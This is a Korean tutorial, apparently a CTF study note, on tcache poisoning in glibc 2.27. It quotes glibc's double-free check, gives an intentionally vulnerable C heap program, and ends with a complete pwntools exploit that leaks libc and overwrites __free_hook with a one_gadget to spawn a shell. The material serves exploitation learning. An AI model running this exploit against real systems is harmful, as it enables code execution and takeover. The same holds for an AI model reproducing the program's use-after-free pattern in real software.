#### version
glibc 2.27


### Tcache Poisoning 이란?
Tcache poisoning은 중복으로 연결된 청크를 재할당하면, 그 청크가 해제된 청크인 동시에, 할당된 청크라는 특징을 이용한다. 이러한 중첩 상태를 이용하면 공격자는 임의 주소에 청크를 할당할 수 있으며, 그 청크를 이용하여 임의 주소의 데이터를 읽거나 조작할 수 있게 됩니다.
Tcache Dup: Double free 등을 이용하여 tcache에 같은 청크를 두 번 이상 연결시키는 기법.
Tcache Poisoning : tcache에 원하는 주소를 추가하여 해당 주소를 할당시키는 기법, 임의 주소 읽기, 쓰기 가능


### 원리
중복으로 연결되 청크를 재할당하면 그 청크는 할당된 청크이며 해제된 청크이다. 이떄 해제된 청크를 기준으로 fd와 bk부분을 보면 할당된 청크를 기준으로 하였을 때 해당 부분은 data 부분이다. 즉 할당된 청크의 data 부분을 조작함으로써 해제된 청크의 fd bk를 조작 가능하고 임의 주소에 청크 할당이 가능하다.

이렇게 될 경우 임의 주소 읽기와 쓰기가 가능해진다.

### double free 보호기법 우회
2.27에서의 double free 보호기법은 다음과 같다.
```c
if (tcache != NULL && tc_idx < mp_.tcache_bins)
      {
	/* Check to see if it's already in the tcache.  */
	tcache_entry *e = (tcache_entry *) chunk2mem (p);

	/* This test succeeds on double free.  However, we don't 100%
	   trust it (it also matches random payload data at a 1 in
	   2^<size_t> chance), so verify it's not an unlikely
	   coincidence before aborting.  */
	if (__glibc_unlikely (e->key == tcache))
	  {
	    tcache_entry *tmp;
	    LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);
	    for (tmp = tcache->entries[tc_idx];
		 tmp;
		 tmp = tmp->next)
	      if (tmp == e)
		malloc_printerr ("free(): double free detected in tcache 2");
	    /* If we get here, it was a coincidence.  We've wasted a
	       few cycles, but don't abort.  */
	  }
```
여기서 e->key == tcache로 검증이 이루어지는데 e->key 만 변조할 수 있다면 이를 우회하여 double free bug를 발생시킬 수 있다.

### 예제
```c
// Name: tcache_poison.c
// Compile: gcc -o tcache_poison tcache_poison.c -no-pie -Wl,-z,relro,-z,now

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
  void *chunk = NULL;
  unsigned int size;
  int idx;

  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);

  while (1) {
    printf("1. Allocate\n");
    printf("2. Free\n");
    printf("3. Print\n");
    printf("4. Edit\n");
    scanf("%d", &idx);

    switch (idx) {
      case 1:
        printf("Size: ");
        scanf("%d", &size);
        chunk = malloc(size);
        printf("Content: ");
        read(0, chunk, size - 1);
        break;
      case 2:
        free(chunk);
        break;
      case 3:
        printf("Content: %s", chunk);
        break;
      case 4:
        printf("Edit chunk: ");
        read(0, chunk, size - 1);
        break;
      default:
        break;
    }
  }
  
  return 0;
}
```

시나리오

일반적으로 `setvbuf(stdout, 0, 2, 0);`와 같이 표준 출력 스트림인 `stdout`을 코드 상에서 명시적으로 사용하면, 바이너리의 .bss 영역에 libc 내 `_IO_2_1_stdout_`을 가리키는 포인터가 존재하게 된다. .bss 영역 내의 `stdout` 포인터는 바이너리가 실행된 후 libc 영역의 `_IO_2_1_stdout_` 주소를 가리키도록 초기화되므로, 이를 릭할 수만 있다면 libc가 매핑된 주소를 계산할 수 있다.

이를 위해 Tcache Poisoning으로 .bss 섹션의 `stdout`에 청크를 할당하고, 값을 읽어서 libc를 leak 하자.

그리고 hook 주소를 알아내서 one_gadget으로 overwrite하여 셸을 딴다.

### payload
```python
from pwn import *

context.log_level = 'debug'


lib = ELF("./libc-2.27.so")
p = process("./t")

malloc_hook = lib.symbols['__free_hook']

pause()

p.sendlineafter(b"4. Edit\n", b'1')
p.sendlineafter(b"Size: ", b'48')
p.sendafter(b"Content: ", b'a')


p.sendlineafter(b"4. Edit\n", b'2')

p.sendlineafter(b"4. Edit\n", b'4')
p.sendlineafter(b"Edit chunk: ", b'bbbbbbbb')

p.sendlineafter(b"4. Edit\n", b'2')

p.sendlineafter(b"4. Edit\n", b'1')
p.sendlineafter(b"Size: ", b'48')
bss_add = 0x601000
p.sendafter(b"Content: ", p64(bss_add))

p.sendlineafter(b"4. Edit\n", b'1')
p.sendlineafter(b"Size: ", b'48')
p.sendlineafter(b"Content: ", b'bbbbbbbb')

p.sendlineafter(b"4. Edit\n", b'1')
p.sendlineafter(b"Size: ", b'48')
p.sendafter(b"Content: ", b'aaaaaaaabbbbbbbb')

p.sendlineafter(b"4. Edit\n", b'3')
p.recvuntil(b"aaaaaaaabbbbbbbb")
libc_leak = u64(p.recv(6)+b"\x00\x00")
libc_base = libc_leak - 0x3ec760

#print(hex(libc_base))

one = libc_base + 0x4f302
hook = libc_base + malloc_hook

###########

p.sendlineafter(b"4. Edit\n", b'1')
p.sendlineafter(b"Size: ", b'64')
p.sendafter(b"Content: ", b'a')


p.sendlineafter(b"4. Edit\n", b'2')

p.sendlineafter(b"4. Edit\n", b'4')
p.sendlineafter(b"Edit chunk: ", b'bbbbbbbb')

p.sendlineafter(b"4. Edit\n", b'2')

p.sendlineafter(b"4. Edit\n", b'1')
p.sendlineafter(b"Size: ", b'64')
p.sendafter(b"Content: ", p64(hook))

p.sendlineafter(b"4. Edit\n", b'1')
p.sendlineafter(b"Size: ", b'64')
p.sendlineafter(b"Content: ", b'bbbbbbbb')

p.sendlineafter(b"4. Edit\n", b'1')
p.sendlineafter(b"Size: ", b'64')
p.sendafter(b"Content: ", p64(one))

p.sendlineafter(b"4. Edit\n", b'2')

p.interactive()

```

one_gadget 조건땜에 malloc_hook은 안되고 free_hook 사용하자

![](https://i.imgur.com/iHHDtrQ.png)
